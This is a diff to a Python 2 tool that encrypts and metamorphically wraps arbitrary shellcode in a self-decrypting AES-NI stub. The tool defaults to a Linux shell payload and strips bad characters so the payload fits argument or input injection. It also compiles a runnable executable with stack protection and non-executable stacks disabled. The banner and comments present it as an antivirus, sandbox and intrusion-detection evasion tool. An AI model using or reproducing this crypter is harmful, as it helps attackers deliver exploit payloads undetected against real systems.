@@ -1,13 +1,48 @@
-#!/usr/bin/python2
+#!/usr/bin/env python2
 
 #-*- encoding:utf-8 -*-
 
-from Crypto import Random
-from Crypto.Cipher import AES
-from random import randint
-from random import shuffle
+from commands import getstatusoutput as shell
+from random import randint, shuffle
 from sys import argv
-from os import system
+from os.path import dirname, realpath
+
+
+badchars=['\x00','\x04','\x05','\x09','\x0a','\x20']
+# these characters are not allowed to make the payload because:
+#	x00 - end of string (thus shellcode) in C-type languages (like PHP)
+#	x04 - end of transmission in networking (end of remote shellcode)
+#	x05 - enquiry in networking (end of remote shellcode)
+#	x09 - horizontal tab (ends shellcode in arguments)
+#	x0a - new line (ends shellcode in argument/input)
+#	x20 - space (ends shellcode in argument)
+
+def genKey():
+	key = ""
+	while True:
+		key = "".join( chr(randint(0, 255)) for i in range(16))
+		if not any(byte in key for byte in badchars):
+			break
+	return key
+
+cipher=dirname(realpath(__file__))+"/AES"
+
+def cryptCode(key,shellcode):
+# we need to use a file as a pipe, otherwise Python will fail input encoding...
+        file=open("/tmp/AEShellcode.s","w")
+        file.write(key+shellcode)
+        file.close()
+        return shell("cat /tmp/AEShellcode.s | "+cipher)[1]
+
+def crypt(shellcode):
+	global key
+	ciphertext = ""
+	while True:
+		ciphertext = cryptCode(key,shellcode)
+		if not any(byte in ciphertext for byte in badchars):
+			break
+		key = genKey()
+	return ciphertext
 
 def morphSig(length=False):
 # metamorphic engine
@@ -74,11 +109,9 @@ def prepare(ciphertext,addresses):
 		oneHalfCiphertext='\x49\xbe'+part[:len(part)/2]+'\x66\x49\x0f\x6e'+movq14[0]
 		twoHalfCiphertext='\x49\xbf'+part[len(part)/2:][len(part)/4:]+part[len(part)/2:][:len(part)/4]+'\x66\x49\x0f\x6e'+movq15[3]
 		preparation='\x0f\xc6'+xmm[0][0]+'\x1b\x0f\xc6'+xmm[0][3]+'\x1b'
-		decrypt='\x66\x41\x0f\xef'+xmm[0][7]+'\x66\x41\x0f\x38\xde'+xmm[0][6]+'\x66\x41\x0f\x38\xde'+xmm[0][5]+'\x66\x41\x0f\x38\xde'+xmm[0][4]+'\x66\x41\x0f\x38\xde'+xmm[0][3]+'\x66\x41\x0f\x38\xde'+xmm[0][2]+'\x66\x41\x0f\x38\xde'+xmm[0][1]+'\x66\x41\x0f\x38\xde'+xmm[0][0]+'\x66\x0f\x38\xde'+xmm[0][7]+'\x66\x0f\x38\xde'+xmm[0][6]+'\x66\x0f\x38\xdf'+xmm[0][5]
+		decrypt='\x66\x41\x0f\xef'+xmm[0][7]+'\x66\x41\x0f\x38\xde'+xmm[0][6]+'\x66\x41\x0f\x38\xde'+xmm[0][5]+'\x66\x41\x0f\x38\xde'+xmm[0][4]+'\x66\x41\x0f\x38\xde'+xmm[0][2]+'\x66\x41\x0f\x38\xde'+xmm[0][1]+'\x66\x0f\x38\xde'+xmm[0][7]+'\x66\x0f\x38\xde'+xmm[0][6]+'\x66\x0f\x38\xdf'+xmm[0][5]
 		storage=''
 		if block == 0:
-#			storage='\x48\xbe\x99\x99\x59\xff\xff\xff\xff\xff\x48\xb8\x89\x96\xf9\xfe\xff\xff\xff\xff\x48\x29\xc6\x0f\x29\x06'
-#			storage='\x48\xbe\x99\x99\x59\xff\xff\xff\xff\xff\x48\xb8\x99\x90\xf9\xfe\xff\xff\xff\xff\x48\x29\xc6\x0f\x29\x06'
 			if addresses:
 				oneSub=[]
 				twoSub=[]
@@ -198,10 +231,10 @@ def prepare(ciphertext,addresses):
 
 movq14=['\xc6','\xce','\xd6','\xde','\xe6','\xee','\xf6','\xfe']
 movq15=['\xc7','\xcf','\xd7','\xdf','\xe7','\xef','\xf7','\xff']
-movaps=['\x06','\x0e','\x16','\x1e','\x26','\x2e','\x36','\x3e']
-#movapsNext=['\x46','\x4e','\x56','\x5e','\x66','\x6e','\x76','\x7e']
-#movapsNext=['\x03','\x0b','\x13','\x1b','\x23','\x2b','\x33','\x3b']
-movapsNext=['\x02','\x0a','\x12','\x1a','\x22','\x2a','\x32','\x3a']
+movaps=['\x06','\x3e','\x16','\x1e','\x26','\x2e','\x36','\x0e']
+movapsNext=['\x02','\x1a','\x12','\x1a','\x22','\x2a','\x32','\x0a']
+# note that the second association between movaps and movapsNext was meant to be the last, but since x0a is a badchar and I didn't find an easy was to avoid it using XMM registers, so I will just put it last in order, thus (unfortunately) giving an argument/input-type payload a maximum size of 112 bytes (can be increased along with the block cipher size), however, this limitation is only valid for the 'self-rewrite'
+#TODO avoid movaps badchar or/and implement 256 bits blocks or/and store shellcode elsewhere (EDX is used for length (use ECX ?))
 xmm=[]
 opcode=0xc0
 for i in range(8):
@@ -272,17 +305,8 @@ print ""
 print "			 IDPS & SandBox & AntiVirus STEALTH KILLER"
 print ""
 
-key = Random.new().read(16)
-#key = '\x4a\xc9\x6a\xda\x73\x4b\x61\x1b\x5e\xbc\xfd\xc3\x7b\x29\x7e\x69'
-#key=key.replace("\x00","\x11")
-clean=False
-while not clean:
-	for byte in key:
-       		if byte == "\x00":
-               		key=Random.new().read(16)
-               		continue
-        clean=True
-# we will use a random 16 bytes (128 bits) key/encryption since, it's more fast and fairly enough, however, we don't want null bytes in our key/code
+key = genKey()
+# we will use a random 16 bytes (128 bits) key/encryption since, it's more fast and fairly enough, however, we don't want badchars in our key/code
 		
 input=raw_input('ENTER YOUR SHELLCODE (like \\x31\\xc0... or blank for a default Linux shell) : ')
 if not input:
@@ -296,46 +320,21 @@ else:
 		for line in file:
 			input+=line
 		file.close()
+	elif len(input)>112:
+		print ""
+		print "WARNING: SHELLCODE IS TOO LONG TO BE EXPLOITED THROUGH ARGUMENTS/INPUT BUT FUNCTIONAL"
 	shellcode=str2hex(input) 
 print ''
 print "SHELLCODE TO MORPH : "+hex2str(shellcode)
-#warnings='\xb0\xb1\xb2\xb3'
-#for byte in shellcode:
-#	for char in warnings:
-#		if byte == char:
-#			print ''
-#			print 'WARNING : IF YOU ARE USING 8-BIT REGISTERS (AL, BL, CL, DL) DECRYPTION MIGHT FAIL'
 # for some reason, sometimes decipher fails to stop after the shellcode and continue the execution through the memory, it's probably linked to an abnormal padding/addressing, but further debugging is necessary (should I erase XMMs before modification?)
 shellcode=pad(shellcode)
 # AES is a block cipher, it operates blocks of a fixed size (16 bytes in our case), so we need to make the code modulo the block size, in order it could be encrypted
 print ''
 print "PADDED CODE : "+hex2str(shellcode)
-#if len(hex2str(shellcode)) > (240*2*2):
-# x2 because of "\x" and another x2 bacause, opcode representation
-#	print ''
-#	print 'SHELLCODE TOO LONG, MAX 240 BYTES'
-#	exit(1)
-cipher = AES.AESCipher(key, AES.MODE_ECB)
 # ECB mode is the simplest and the fastest, it has a huge security lack though, but not for our purpose, so we have already 2^128 possibilities
 
-ciphertext = cipher.encrypt(shellcode)
-clean=False
-while not clean:
-	for byte in ciphertext:
-		if byte == "\x00":
-			key=Random.new().read(16)
-			while not clean:
-        			for byte in key:
-                			if byte == "\x00":
-                        			key=Random.new().read(16)
-                        			continue
-        			clean=True
-			clean=False
-			cipher = AES.AESCipher(key, AES.MODE_ECB)
-			ciphertext=cipher.encrypt(shellcode)
-			continue
-	clean=True
-# no null bytes
+ciphertext = crypt(shellcode)
+# in order to avoid badchars, I had to recode AES-NI assembly implementation and change the algorithm it-self, plus we will check for bad characters in the ciphertext since, it's random and re-encrypt it with a different key in case
 
 print ''
 print "KEY : "+hex2str(key)
@@ -345,9 +344,9 @@ print "ENCRYPTED CODE : "+hex2str(ciphertext)
 # you can also specify your own address for some tests/exploitations
 print ''
 #address=raw_input('SPECIFY THE SHELLCODE\'S EXECUTION ADDRESS (8 hexas like \\x00\\x00\\x00\\x00\\x06\\x00\\x90\\x00 or blank to auto-detect) : ')
-address=raw_input('SPECIFY THE SHELLCODE\'S EXECUTION ADDRESS (8 hexas like 0x0000000000600900 or blank to auto-detect) : ')
+address=raw_input('SPECIFY THE SHELLCODE\'S EXECUTION ADDRESS (8 hexas like 0x0000000000600900 or blank for self-rewrite) : ')
+#TODO 8 hexas should be 6 since, kernel user space wouldn't allocate more
 if address:
-#	address=str2hex(address)
 	print ''
 	print 'ADDRESS : '+address
 # zeroes will be obfuscated
@@ -369,7 +368,7 @@ oneHalfKey='\x49\xbe'+key[:len(key)/2]+'\x66\x49\x0f\x6e'+movq14[0]
 twoHalfKey='\x49\xbf'+key[len(key)/2:][len(key)/4:]+key[len(key)/2:][:len(key)/4]+'\x66\x49\x0f\x6e'+movq15[3]
 # another 2^128 possibilities per block
 insertKey='\x0f\xc6'+xmm[0][0]+'\x1b\x0f\xc6'+xmm[0][3]+'\x1b\x0f\x28'+xmm[5][0]+'\x66\x0f\xef'+xmm[2][2]
-expandKey='\x66\x0f\x3a\xdf'+xmm[1][0]+'\x01\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x0f\x38\xdb'+xmm[6][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x02\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x0f\x38\xdb'+xmm[7][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x04\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[0][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x08\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[1][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x10\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[2][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x20\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[3][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x40\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[4][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x80\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[5][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x1b\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[6][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x36\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x44\x0f\x28'+xmm[7][0]
+expandKey='\x66\x0f\x3a\xdf'+xmm[1][0]+'\x01\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x0f\x38\xdb'+xmm[6][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x02\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x0f\x38\xdb'+xmm[7][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x08\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[1][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x10\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[2][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x40\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[4][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x80\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[5][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x1b\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[6][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x36\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x44\x0f\x28'+xmm[7][0]
 decryption=prepare(ciphertext,address)
 # futher obfuscation of values is possible, but since it's already a 0-day, there's no need, for now
 exe='\xff\xe6'
@@ -381,14 +380,13 @@ input=raw_input('PRODUCE AN EXECUTABLE (blank to confirm)? : ')
 #input=input.lower()
 #if input == 'y' or input == 'yes':
 if not input :
-	file=open("shellcode.c","w")
+	file=open("/tmp/AEShellcode.c","w")
 	file.write("unsigned char shellcode[]=\""+hex2str(shellcode)+"\";")
 	file.write("main(){int (*ret)()=(int(*)()) shellcode; ret();}")
 	file.close()
-	system("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode && rm shellcode.c")
+	execute=shell("gcc -fno-stack-protector -z execstack /tmp/AEShellcode.c -o AEShellcode")
 # stack protector is mandatory in some cases
 	print ''
-	print 'READY TO LAUNCH : ./shellcode'
+	print 'READY TO LAUNCH : ./AEShellcode'
 print ''
 # as you can see, the total number of possible produced shellcodes for one given of this morpher is far more that the number of atoms in the univers (>10^80) and it's pretty hard to heuristically detect it, as well as using sandboxing
-
